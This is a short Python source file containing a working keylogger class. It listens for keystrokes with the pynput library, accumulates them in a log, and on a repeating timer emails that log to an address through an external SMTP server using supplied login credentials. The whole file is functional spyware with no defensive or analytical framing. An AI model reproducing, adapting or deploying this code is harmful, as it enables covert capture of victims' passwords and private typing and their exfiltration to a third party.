import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string 

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) +  " " 
        self.append_to_log(current_key)
        
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)#send a initial message at the beginning of keylogger
        self.log = ""
        timer = threading.Timer(self.interval, self.report) #waiting for 5 second and call the report() again and again
        timer.start()

    def send_mail(self, email, password, message):
         server = smtplib.SMTP("smtp.qq.com", 25)
         #server = smtplib.SMTP("smtp.gmail.com", 587)
         server.starttls()#initiate connection
         server.login(email, password)#login in
         server.sendmail(email, email, message)#send email to my own mail

    def start(self): 
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        # with used to interact with unmanaged streams of data
        with keyboard_listener: 
            self.report()
            keyboard_listener.join() #.join() used to start the listener
